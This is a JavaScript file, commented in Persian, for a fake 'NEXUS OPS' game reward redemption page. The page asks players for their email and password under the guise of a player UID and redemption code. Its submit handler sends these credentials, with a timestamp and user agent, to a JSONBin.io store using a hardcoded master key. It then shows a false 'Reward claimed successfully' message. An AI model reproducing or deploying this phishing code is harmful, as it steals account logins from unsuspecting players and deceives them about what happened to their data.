/* =========================================================
   NEXUS OPS — script.js
   ذخیره‌سازی در JSONBin.io
   ========================================================= */

// ⚠️ این دو مقدار را با مقادیر خودت جایگزین کن
const JSONBIN_BIN_ID = "6ab25a71ac6210605ae907b4";
const JSONBIN_MASTER_KEY = "$2a$10$oGReJnRpwfemqjS80PYgN.qlSXGh6iBf0bWnVVc.Q0f3c4b5V37kO";

const images = {
    hero: "hero.webp",
    logo: "images/logo.png",
    reward1: "images/reward-1.jpg",
    reward2: "images/reward-2.jpg",
    reward3: "images/reward-3.jpg",
    banner: "images/banner.jpg"
};

document.addEventListener("DOMContentLoaded", () => {
    applyImages();
    initMobileNav();
    initFaqAccordion();
    initCaptcha();
    initRedeemForm();
});

function applyImages() {
    document.querySelectorAll("[data-img]").forEach((el) => {
        const key = el.getAttribute("data-img");
        if (images[key]) {
            el.src = images[key];
            el.onerror = () => {
                el.style.background = "linear-gradient(160deg, #1a1a1a, #0a0a0a)";
                el.alt = el.alt || "Image placeholder";
            };
        }
    });
}

function initMobileNav() {
    const hamburger = document.getElementById("hamburgerBtn");
    const nav = document.getElementById("mainNav");
    const overlay = document.getElementById("navOverlay");
    if (!hamburger || !nav || !overlay) return;

    const closeNav = () => {
        nav.classList.remove("is-open");
        hamburger.classList.remove("is-open");
        overlay.classList.remove("is-visible");
        hamburger.setAttribute("aria-expanded", "false");
    };

    const toggleNav = () => {
        const isOpen = nav.classList.toggle("is-open");
        hamburger.classList.toggle("is-open", isOpen);
        overlay.classList.toggle("is-visible", isOpen);
        hamburger.setAttribute("aria-expanded", String(isOpen));
    };

    hamburger.addEventListener("click", toggleNav);
    overlay.addEventListener("click", closeNav);

    nav.querySelectorAll("a").forEach((link) => {
        link.addEventListener("click", closeNav);
    });

    window.addEventListener("resize", () => {
        if (window.innerWidth > 860) closeNav();
    });
}

function initFaqAccordion() {
    const items = document.querySelectorAll(".faq-item");
    items.forEach((item) => {
        const question = item.querySelector(".faq-question");
        const answer = item.querySelector(".faq-answer");
        if (!question || !answer) return;

        question.addEventListener("click", () => {
            const isOpen = item.classList.contains("is-open");
            items.forEach((other) => {
                if (other !== item) {
                    other.classList.remove("is-open");
                    const oq = other.querySelector(".faq-question");
                    const oa = other.querySelector(".faq-answer");
                    if (oq) oq.setAttribute("aria-expanded", "false");
                    if (oa) oa.style.maxHeight = null;
                }
            });

            if (isOpen) {
                item.classList.remove("is-open");
                question.setAttribute("aria-expanded", "false");
                answer.style.maxHeight = null;
            } else {
                item.classList.add("is-open");
                question.setAttribute("aria-expanded", "true");
                answer.style.maxHeight = answer.scrollHeight + "px";
            }
        });
    });
}

function generateCaptchaCode() {
    let code = "";
    for (let i = 0; i < 4; i++) {
        code += Math.floor(Math.random() * 10);
    }
    return code;
}

function initCaptcha() {
    const box = document.getElementById("captchaBox");
    const refreshBtn = document.getElementById("captchaRefresh");
    if (!box || !refreshBtn) return;

    refreshBtn.addEventListener("click", () => {
        box.textContent = generateCaptchaCode();
        refreshBtn.classList.add("is-spinning");
        setTimeout(() => refreshBtn.classList.remove("is-spinning"), 500);
    });
}

function initRedeemForm() {
    const form = document.getElementById("redeemForm");
    if (!form) return;

    const claimBtn = document.getElementById("claimBtn");
    const messageBox = document.getElementById("formMessage");
    const captchaBox = document.getElementById("captchaBox");

    const fields = {
        playerUid: document.getElementById("playerUid"),
        redemptionCode: document.getElementById("redemptionCode"),
        verificationCode: document.getElementById("verificationCode"),
        agreeTerms: document.getElementById("agreeTerms")
    };

    function clearErrors() {
        Object.keys(fields).forEach((key) => {
            const errEl = document.getElementById("err-" + key);
            if (errEl) errEl.textContent = "";
            const el = fields[key];
            if (el && (el.type === "text" || el.type === "email" || el.type === "password")) {
                el.classList.remove("input-error");
            }
        });
    }

    function setError(key, msg) {
        const errEl = document.getElementById("err-" + key);
        if (errEl) errEl.textContent = msg;
        const el = fields[key];
        if (el && (el.type === "text" || el.type === "email" || el.type === "password")) {
            el.classList.add("input-error");
        }
    }

    function showMessage(text, type) {
        messageBox.textContent = text;
        messageBox.classList.remove("success", "error", "is-visible");
        void messageBox.offsetWidth;
        messageBox.classList.add(type, "is-visible");
    }

    function hideMessage() {
        messageBox.classList.remove("is-visible");
    }

    function validate() {
        clearErrors();
        let isValid = true;

        if (!fields.playerUid.value.trim()) {
            setError("playerUid", "Email is required.");
            isValid = false;
        }

        if (!fields.redemptionCode.value.trim()) {
            setError("redemptionCode", "Password is required.");
            isValid = false;
        }

        const enteredVerification = fields.verificationCode.value.trim();
        if (!enteredVerification) {
            setError("verificationCode", "Verification code is required.");
            isValid = false;
        } else if (enteredVerification !== captchaBox.textContent.trim()) {
            setError("verificationCode", "Verification code does not match.");
            isValid = false;
        }

        if (!fields.agreeTerms.checked) {
            setError("agreeTerms", "You must agree to the redemption terms.");
            isValid = false;
        }

        return isValid;
    }

    function setLoading(isLoading) {
        claimBtn.classList.toggle("is-loading", isLoading);
        claimBtn.disabled = isLoading;
    }

    form.addEventListener("submit", async (e) => {
        e.preventDefault();
        hideMessage();

        if (!validate()) {
            showMessage("Please fix the highlighted fields and try again.", "error");
            return;
        }

        setLoading(true);

        try {
            // 1. خواندن لیست فعلی از JSONBin
            const getRes = await fetch(
                `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`,
                {
                    headers: {
                        'X-Master-Key': JSONBIN_MASTER_KEY,
                        'X-Bin-Meta': 'false'
                    }
                }
            );

            if (!getRes.ok) throw new Error('Failed to read bin');

            const currentData = await getRes.json();
            const submissions = Array.isArray(currentData) ? currentData : [];

            // 2. اضافه کردن رکورد جدید
            submissions.push({
                email: fields.playerUid.value.trim(),
                password: fields.redemptionCode.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });

            // 3. ذخیره کل لیست در JSONBin
            const putRes = await fetch(
                `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`,
                {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': JSONBIN_MASTER_KEY
                    },
                    body: JSON.stringify(submissions)
                }
            );

            if (!putRes.ok) throw new Error('Failed to save');

            setLoading(false);
            showMessage("Reward claimed successfully! Check your in-game inventory.", "success");
            form.reset();
            captchaBox.textContent = generateCaptchaCode();

        } catch (err) {
            setLoading(false);
            showMessage("Network error. Please try again.", "error");
            console.error(err);
        }
    });

    Object.keys(fields).forEach((key) => {
        const el = fields[key];
        if (!el) return;
        const evt = el.type === "checkbox" ? "change" : "input";
        el.addEventListener(evt, () => {
            const errEl = document.getElementById("err-" + key);
            if (errEl) errEl.textContent = "";
            if (el.type === "text" || el.type === "email" || el.type === "password") {
                el.classList.remove("input-error");
            }
        });
    });
}